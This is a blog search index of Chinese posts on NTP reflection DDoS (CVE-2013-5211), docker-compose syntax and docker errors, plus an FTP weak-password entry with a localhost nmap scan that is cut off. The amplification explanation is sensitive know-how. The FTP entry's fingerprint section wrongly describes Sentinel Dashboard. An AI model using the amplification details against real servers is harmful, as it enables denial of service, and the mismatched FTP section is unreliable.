<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>udp_flood</title>
    <link href="/2024/03/08/security/netSec/ddos/udp_flood/"/>
    <url>/2024/03/08/security/netSec/ddos/udp_flood/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在DDoS攻击中，攻击方式以协议进行划分的话，主要是TCP Flood，UDP Flood，ICMP Flood 等，其中 UDP Flood是最主要也是最常见的流量型攻击方式。</p><p>2021年5月，QUIC正式成为互联网标准协议，针对80、443端口的UDP Flood徒增。</p><h1 id="ntp反射"><a href="#ntp反射" class="headerlink" title="ntp反射"></a>ntp反射</h1><h2 id="放大倍数"><a href="#放大倍数" class="headerlink" title="放大倍数"></a>放大倍数</h2><p>556.9</p><h2 id="协议端口"><a href="#协议端口" class="headerlink" title="协议端口"></a>协议端口</h2><p>协议：UDP</p><p>端口：123</p><h2 id="ntp反射原理"><a href="#ntp反射原理" class="headerlink" title="ntp反射原理"></a>ntp反射原理</h2><h3 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h3><p>ntp(Network Time Protocol)网络时间协议，采用服务器-客户端模型，提供高精度的时间矫正机制，客户端会定时从服务器同步自身时间。</p><p>存在监控(monlist)功能，用于监控NTP服务器。NTP服务器会记录与服务器进行过时间同步的客户端IP，客户端可通过命令获取记录的IP。</p><p>每个NTP服务器可以记录进行过时间同步的最后600个客户端的IP，客户端获取记录的时候，服务器会返回记录的600个客户端IP地址，响应包按照6个IP地址进行分割，最多可以返回100个响应包。</p><h3 id="涉及漏洞-反射放大攻击-CVE-2013-5211"><a href="#涉及漏洞-反射放大攻击-CVE-2013-5211" class="headerlink" title="涉及漏洞-反射放大攻击(CVE-2013-5211)"></a>涉及漏洞-反射放大攻击(CVE-2013-5211)</h3><h4 id="反射含义"><a href="#反射含义" class="headerlink" title="反射含义"></a>反射含义</h4><p>UDP协议是无状态的，不会进行校验请求来源。客户端请求，服务端响应，就是一次交互。正是由于无状态的特点，导致部分低版本的ntp服务器没有针对请求地址的校验机制，可以进行请求地址伪造，将响应内容返回给伪造的请求地址，从而造成对伪造请求地址的攻击。</p><h4 id="放大含义"><a href="#放大含义" class="headerlink" title="放大含义"></a>放大含义</h4><p>由于NTP协议的monlist功能，攻击者利用僵尸主机，同时向NTP服务器发起大量monlist请求，1个monlist请求可造成100个响应数据包。</p><p>通常情况下，每个ntp请求包的大小约为90字节，正常响应包大小也应该为90字节左右，monlist的响应包大小约为482字节，100个响应数据包是48200字节，相比正常响应包放大了500倍。</p><p><img src="/UDP%E5%8F%8D%E5%B0%84Photos/image-20220210191122490.png" alt="image-20220210191122490"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
      <category>ddos</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>ddos</tag>
      
      <tag>udpflood</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ntp_domain</title>
    <link href="/2024/03/08/yunwei/applications/ntp/ntp_domain/"/>
    <url>/2024/03/08/yunwei/applications/ntp/ntp_domain/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="常见ntp服务域名"><a href="#常见ntp服务域名" class="headerlink" title="常见ntp服务域名"></a>常见ntp服务域名</h1><h2 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><table><thead><tr><th align="left">经典网络内网</th><th align="left">专有网络VPC内网</th><th align="left">公网</th></tr></thead><tbody><tr><td align="left">-</td><td align="left">ntp.cloud.aliyuncs.com</td><td align="left">ntp.aliyun.com</td></tr><tr><td align="left">ntp1.cloud.aliyuncs.com</td><td align="left">ntp7.cloud.aliyuncs.com</td><td align="left">ntp1.aliyun.com</td></tr><tr><td align="left">ntp2.cloud.aliyuncs.com</td><td align="left">ntp8.cloud.aliyuncs.com</td><td align="left">ntp2.aliyun.com</td></tr><tr><td align="left">ntp3.cloud.aliyuncs.com</td><td align="left">ntp9.cloud.aliyuncs.com</td><td align="left">ntp3.aliyun.com</td></tr><tr><td align="left">ntp4.cloud.aliyuncs.com</td><td align="left">ntp10.cloud.aliyuncs.com</td><td align="left">ntp4.aliyun.com</td></tr><tr><td align="left">ntp5.cloud.aliyuncs.com</td><td align="left">ntp11.cloud.aliyuncs.com</td><td align="left">ntp5.aliyun.com</td></tr><tr><td align="left">ntp6.cloud.aliyuncs.com</td><td align="left">ntp12.cloud.aliyuncs.com</td><td align="left">ntp6.aliyun.com</td></tr><tr><td align="left">-</td><td align="left">-</td><td align="left">ntp7.aliyun.com</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>ntp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>ntp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_compose</title>
    <link href="/2024/03/07/yunwei/applications/docker/docker_compose/"/>
    <url>/2024/03/07/yunwei/applications/docker/docker_compose/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>项目（project）由一组关联的应用容器组成一个完整业务单元</p><p>服务（service）一个应用容器</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><p>指定yml基于的docker-compose版本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">version</span>: &#x27;<span class="hljs-number">2</span>.<span class="hljs-number">3</span>&#x27;<br></code></pre></td></tr></table></figure><h3 id="services"><a href="#services" class="headerlink" title="services"></a>services</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">services</span>:<br>  <span class="hljs-attribute">redis</span>:<br>    <span class="hljs-attribute">image</span>: redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">9</span>-alpine<br></code></pre></td></tr></table></figure><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>指定容器运行的镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">image</span>: redis<br><span class="hljs-attribute">image</span>: ubuntu:<span class="hljs-number">14</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">image</span>: example-registry.com:<span class="hljs-number">4000</span>/postgresql<br><span class="hljs-attribute">image</span>: a4bc65fd # 镜像id<br><span class="hljs-attribute">image</span>: vulhub/airflow:<span class="hljs-number">1</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h3><p>添加环境变量，值可以为数组、字典或布尔值，布尔值需要使用引号，否则YML解析器转换为 True 或 False</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">postgresql</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres:12-alpine</span><br>  <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=gitlab</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=password</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  docker docker-compose <span class="hljs-keyword">up</span> <br>Creating network <span class="hljs-string">&quot;docker_default&quot;</span> with the default driver<br>Pulling pgsql (postgre<span class="hljs-variable">s:12</span>-alpine)...<br><span class="hljs-number">12</span>-alpine: Pulling from library/postgres<br><span class="hljs-number">9</span>b18e9b68314: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">75</span>aada9edfc5: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">820773693750</span>: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">83</span>dc43929537: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">92</span>e2c19af124: Pull <span class="hljs-built_in">complete</span><br><span class="hljs-number">52</span>f242e5c209: Pull <span class="hljs-built_in">complete</span><br>e0a8c8565c42: Pull <span class="hljs-built_in">complete</span><br>a424ab832487: Pull <span class="hljs-built_in">complete</span><br>Digest: <span class="hljs-built_in">sha256</span>:<span class="hljs-number">55</span>fb7ba926381c2ac1f8f58bb181dd932f140aa467c3097a07c6815648dbc5e2<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> postgre<span class="hljs-variable">s:12</span>-alpine<br>Creating docker_pgsql_1 ... done<br>Attaching <span class="hljs-keyword">to</span> docker_pgsql_1<br><br>➜  ~ docker <span class="hljs-keyword">ps</span><br>CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS          PORTS      NAMES<br><span class="hljs-number">34264</span>c6a3d67   postgre<span class="hljs-variable">s:12</span>-alpine   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">55</span> seconds ago   Up <span class="hljs-number">54</span> seconds   <span class="hljs-number">5432</span>/tcp   docker_pgsql_1<br><br></code></pre></td></tr></table></figure><h3 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a>depends_on</h3><p>设置依赖关系</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.</span><br>    <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">db</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres</span><br></code></pre></td></tr></table></figure><p>docker-compose up：按照依赖关系启动服务，例如：先启动db和redis，再启动web，但是并不是说必须等db和redis启动完成再启动web</p><p>docker-compose up SERVICE：自动包含指定SERVER的依赖项</p><p>docker-compose stop ：按照依赖关系停止服务</p><h3 id="ports"><a href="#ports" class="headerlink" title="ports"></a>ports</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">gitlab</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">vulhub/gitlab:13.10.1</span><br>  <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">postgresql</span><br>  <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:80&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;10022:22&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;443&quot;</span><br></code></pre></td></tr></table></figure><p>绑定容器的8080到主机的80</p><p>绑定容器的443到主机的任意端口，取决于容器启动时的随机端口</p><h3 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a>volumes</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">postgresql</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">postgres:11.9-alpine</span><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_USER=gitlab</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_PASSWORD=password</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">POSTGRES_DB=gitlabhq_production</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">DB_EXTENSION=pg_trgm</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">./load-extensions.sh:/docker-entrypoint-initdb.d/load-extensions.sh</span><br></code></pre></td></tr></table></figure><p>主机文件或数据卷挂载到容器中</p><h3 id="command"><a href="#command" class="headerlink" title="command"></a>command</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">namenode</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">vulhub/hadoop:2.8.1</span><br>  <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">HDFS_CONF_dfs_namenode_name_dir=file:///hadoop/dfs/name</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">CLUSTER_NAME=vulhub</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">HDFS_CONF_dfs_replication=1</span><br>  <span class="hljs-attribute">command</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/namenode.sh</span><br></code></pre></td></tr></table></figure><p>覆盖容器启动的默认命令</p><h3 id="healthcheck"><a href="#healthcheck" class="headerlink" title="healthcheck"></a>healthcheck</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">healthcheck:</span><br><span class="hljs-symbol">  test:</span> [<span class="hljs-string">&quot;CMD&quot;</span>, <span class="hljs-string">&quot;pg_isready&quot;</span>, <span class="hljs-string">&quot;-U&quot;</span>, <span class="hljs-string">&quot;airflow&quot;</span>] <span class="hljs-meta">#设置检查程序</span><br><span class="hljs-symbol">  interval:</span> <span class="hljs-number">1</span>m5s <span class="hljs-meta">#设置检测间隔</span><br><span class="hljs-symbol">  retries:</span> <span class="hljs-number">5</span> <span class="hljs-meta">#设置重试次数</span><br><span class="hljs-symbol">  timeout:</span> <span class="hljs-number">10</span> <span class="hljs-meta">#设置超时时间</span><br><span class="hljs-symbol">  start_period:</span> <span class="hljs-number">1</span>m40s <span class="hljs-meta">#设置程序启动多久后开始检测</span><br></code></pre></td></tr></table></figure><h3 id="container-name"><a href="#container-name" class="headerlink" title="container_name"></a>container_name</h3><p>指定容器名称，而非默认生成的名称</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">container_name: <span class="hljs-keyword">my</span>-container<br></code></pre></td></tr></table></figure><h3 id="devices"><a href="#devices" class="headerlink" title="devices"></a>devices</h3><p>指定设备映射列表</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">devices:</span> <br>    - <span class="hljs-string">&quot;/dev/ttyUSB0:/dev/ttyUSB0&quot;</span><br></code></pre></td></tr></table></figure><h3 id="dns"><a href="#dns" class="headerlink" title="dns"></a>dns</h3><p>自定义DNS服务器，可以为单个值，也可以为列表</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">dns</span><span class="hljs-punctuation">:</span> <span class="hljs-string">8.8.8.8</span><br><br><span class="hljs-attribute">dns</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">8.8.8.8</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">114.114.114.114</span><br></code></pre></td></tr></table></figure><h3 id="dns-search"><a href="#dns-search" class="headerlink" title="dns_search"></a>dns_search</h3><p>自定义DNS搜索域，可以为单个值，也可以为列表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dns_search: ns1<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span><br><br>dns_search: <br>    - ns2<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span><br>    - ns3<span class="hljs-selector-class">.test</span>.com<br></code></pre></td></tr></table></figure><h3 id="env-file"><a href="#env-file" class="headerlink" title="env_file"></a>env_file</h3><p>从文件中添加环境变量</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">env_file</span><span class="hljs-punctuation">:</span> <span class="hljs-string">.env</span><br><br><span class="hljs-attribute">env_file</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">envfile2.env</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">./envfile3.env</span><br><br></code></pre></td></tr></table></figure><h3 id="expose"><a href="#expose" class="headerlink" title="expose"></a>expose</h3><p>暴露端口，但不映射到宿主机，也就是说只有内部可使用</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">expose:</span> <br>    - <span class="hljs-string">&quot;3333&quot;</span><br>    - <span class="hljs-string">&quot;6666&quot;</span><br></code></pre></td></tr></table></figure><h3 id="extra-hosts"><a href="#extra-hosts" class="headerlink" title="extra_hosts"></a>extra_hosts</h3><p>添加主机名映射，在容器&#x2F;etc&#x2F;hosts中创建主机名和IP绑定关系</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">extra_hosts:</span> <br>     - <span class="hljs-string">&quot;newhost:1.1.1.1&quot;</span><br>     - <span class="hljs-string">&quot;oldhost:2.2.2.2&quot;</span><br></code></pre></td></tr></table></figure><h3 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h3><p>服务日志记录配置</p><p>di r</p><h3 id="build"><a href="#build" class="headerlink" title="build"></a>build</h3><p>指定镜像构建上下文路径</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_error</title>
    <link href="/2024/03/07/yunwei/applications/docker/docker_error/"/>
    <url>/2024/03/07/yunwei/applications/docker/docker_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="docker-pull-error"><a href="#docker-pull-error" class="headerlink" title="docker pull error"></a>docker pull error</h1><h2 id="image-name-error"><a href="#image-name-error" class="headerlink" title="image name error"></a>image name error</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) root@localhost:~# docker pull gitlab-ce/gitlab-ce:14.9.1<br><span class="hljs-keyword">Error </span>response from daemon: pull access denied for gitlab-ce/gitlab-ce, repository does not exist or may require &#x27;docker login&#x27;: denied: requested access to the resource is denied<br></code></pre></td></tr></table></figure><p>因为镜像名称写错导致报错，正确镜像名称gitlab&#x2F;gitlab-ce</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker search gitlab-ce</span><br><span class="hljs-title class_">NAME</span>                                     <span class="hljs-title class_">DESCRIPTION</span>                                     <span class="hljs-title class_">STARS</span>     <span class="hljs-title class_">OFFICIAL</span>   <span class="hljs-title class_">AUTOMATED</span><br>gitlab/gitlab-ce                         <span class="hljs-title class_">GitLab</span> <span class="hljs-title class_">Community</span> <span class="hljs-title class_">Edition</span> docker image based …   <span class="hljs-number">3592</span>                 [<span class="hljs-title class_">OK</span>]<br><br></code></pre></td></tr></table></figure><h2 id="image-tag-error"><a href="#image-tag-error" class="headerlink" title="image tag error"></a>image tag error</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) root@localhost:~# docker pull gitlab/gitlab-ce:14.9.1<br><span class="hljs-keyword">Error </span>response from daemon: manifest for gitlab/gitlab-ce:14.9.1 not found: manifest unknown: manifest unknown<br><br></code></pre></td></tr></table></figure><p>因为镜像版本号不对导致报错，需要正确版本号</p><p>如何确认正常版本号</p><p>登录docker hub <a href="https://hub.docker.com/u/library">https://hub.docker.com/u/library</a> 搜索对应的镜像</p><p>复制提供的命令即可正确下载</p><p><a href="https://blog.csdn.net/ichen820/article/details/114536044">https://blog.csdn.net/ichen820/article/details/114536044</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iotop</title>
    <link href="/2024/03/04/yunwei/commands/iotop/"/>
    <url>/2024/03/04/yunwei/commands/iotop/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ftp_weak_password</title>
    <link href="/2024/03/04/security/secvulns/ftp/ftp_weak_password/"/>
    <url>/2024/03/04/security/secvulns/ftp/ftp_weak_password/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>ftp弱口令</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>ftp服务存在弱口令</p><h2 id="漏洞级别"><a href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h2><p>高危</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、禁止将ftp&#x2F;sftp服务暴露在公网</p><p>2、设置强口令，包含数字、大小写字母、特殊字符，长度10位以上</p><p>3、设置访问来源IP限制</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a>默认信息</h3><p>默认端口 21（TCP）</p><h3 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h3><p>title：Sentinel Dashboard</p><h3 id="服务查询"><a href="#服务查询" class="headerlink" title="服务查询"></a>服务查询</h3><h4 id="fofa-info"><a href="#fofa-info" class="headerlink" title="fofa.info"></a>fofa.info</h4><p>“title: Sentinel Dashboard”</p><h4 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h4><p>nmap -A 进行探测 ，SERVER 为 http-proxy ，页面中包含 “Sentinel Dashboard”</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs wren">➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">A</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-number">8080</span>   <br><span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span> ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-02-23 10:50 CST</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-title function_">localhost</span> (<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>)<br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.00026</span>s <span class="hljs-variable">latency</span>).<br><br><span class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>    <span class="hljs-variable">VERSION</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">favicon</span>: <span class="hljs-title class_">Spring</span> <span class="hljs-title class_">Java</span> <span class="hljs-title class_">Framework</span><br><span 